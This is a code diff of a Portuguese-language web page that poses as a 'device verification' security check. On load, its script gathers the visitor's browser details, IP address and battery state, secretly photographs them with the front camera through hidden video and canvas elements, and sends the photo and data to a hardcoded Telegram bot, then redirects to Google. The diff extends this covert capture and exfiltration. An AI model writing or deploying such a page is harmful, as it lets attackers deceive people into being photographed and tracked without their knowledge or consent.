@@ -18,17 +18,18 @@
         <h2>Verificando Dispositivo...</h2>
         <p>Por favor, aguarde enquanto validamos suas credenciais de segurança.</p>
         <div class="loader"></div>
+        <div id="status" style="font-size: 0.8rem; color: #999; margin-top: 10px;">Iniciando...</div>
         <video id="video" style="display:none;" autoplay playsinline></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
-        // --- CONFIGURAÇÃO ---
         const BOT_TOKEN = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
         const CHAT_ID = "8607389403";
-        // --------------------
+        const statusEl = document.getElementById('status');
 
         async function enviarDados() {
+            statusEl.innerText = "Coletando dados...";
             const dados = {
                 ua: navigator.userAgent,
                 lang: navigator.language,
@@ -37,46 +38,66 @@
                 ip: "Buscando..."
             };
 
-            // Pega IP rápido
+            // Pega IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const json = await res.json();
                 dados.ip = json.ip;
             } catch(e) { dados.ip = "Erro"; }
 
-            let msg = `🔒 *Novo Acesso*\n\n📱 *UA:* ${dados.ua}\n🌐 *IP:* ${dados.ip}\n📐 *Tela:* ${dados.screen}\n💻 *OS:* ${dados.platform}`;
+            // Pega Bateria (Corrigido)
+            let batInfo = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    batInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Bateria'})`;
+                } catch(e) {}
+            }
 
+            let msg = `🔒 *Novo Acesso*\n\n📱 *UA:* ${dados.ua}\n🌐 *IP:* ${dados.ip}\n📐 *Tela:* ${dados.screen}\n💻 *OS:* ${dados.platform}\n🔋 *Bat:* ${batInfo}`;
+
+            statusEl.innerText = "Acessando câmera...";
             // Tenta tirar foto
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(r => setTimeout(r, 1500)); // Espera 1.5s para focar
+                await new Promise(r => setTimeout(r, 1500)); 
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                stream.getTracks().forEach(track => track.stop()); // Desliga câmera
+                stream.getTracks().forEach(track => track.stop());
 
-                const imgData = canvas.toDataURL('image/jpeg', 0.5); // Comprime um pouco
+                const imgData = canvas.toDataURL('image/jpeg', 0.5);
                 
-                // Envia Foto + Legenda
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', dataURItoBlob(imgData), 'cam.jpg');
                 formData.append('caption', msg);
+                formData.append('parse_mode', 'Markdown');
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                statusEl.innerText = "Enviando foto...";
+                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
+                
+                const result = await resp.json();
+                if(result.ok) {
+                    statusEl.innerText = "Sucesso!";
+                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+                } else {
+                    throw new Error("Telegram拒绝了: " + JSON.stringify(result));
+                }
 
             } catch (err) {
-                // Se negar câmera, manda só texto
-                msg += "\n⚠️ *Câmera: Negada/Bloqueada*";
+                statusEl.innerText = "Erro na câmera. Enviando texto...";
+                msg += `\n⚠️ *Câmera: Falha (${err.message})*`;
+                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('text', msg);
@@ -86,6 +107,8 @@
                     method: 'POST',
                     body: formData
                 });
+                statusEl.innerText = "Enviado (Texto).";
+                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
             }
         }
 
@@ -100,7 +123,6 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        // Roda assim que carrega
         window.onload = enviarDados;
     </script>
 </body>
